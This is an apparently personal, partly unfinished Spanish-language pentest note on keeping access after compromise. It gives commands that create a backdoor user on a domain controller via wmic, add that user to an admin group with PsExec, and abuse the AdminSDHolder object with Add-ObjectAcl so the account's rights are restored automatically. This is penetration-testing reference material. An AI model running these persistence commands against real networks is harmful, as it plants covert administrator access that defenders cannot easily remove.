# Keep Access:
Mantener el acceso es importante porque los pentest duran dias, no es funcional tener que explotar las vulnerabilidades todos los dias, lo mejor es buscar formas más directas de acceder de nuevo.

* Siempre borra los accesos o cambios que hayas creado!

## Local Admin:

### Start Up folder:


## Active Directory:

### Domain Dominance:
Cuando se tiene domain admin, se puede tomar permanencia de diversos formas:

#### Remote Code Exec:
Agregando un usuario que conozcamos la contraseña para poder ejecutar por CLI conexiones:

- wmic /node:<DomaincontrollerName> process call create "net user /add PiratedProcess Du^^Y01" Here, PiratedProcess and Du^^Y01 are the user ID and password of the planted dummy process on the target user’s DC.

Add the user to the “Admins” group.
- PsExec.exe \\< DomaincontrollerName> -accepteula net localgroup "Admins" PiratedProcess /add

### AdminSDHolder:
Función de AD que hace que cada cierto tiempo (1 min por defecto) se asigen de nuevo los permisos de "domain admin" a los usuarios adminsitradores del AD, con la finalidad que sí un usuario es modificado maliciosamente o por error vuelva a su estado normal.
Pero esta misma función puede ser util para que en caso de que se eliminen permisos a un usuario agregado maliciosamente, se resetee a domain admin por el objeto AdminSDHolder.

```
Add-ObjectAcl-TargetADSprefix 'CN=AdminSDHolder,CN=System' PrincipalSamAccountName Martin -Verbose -Rights All 
```


### Power-tools
















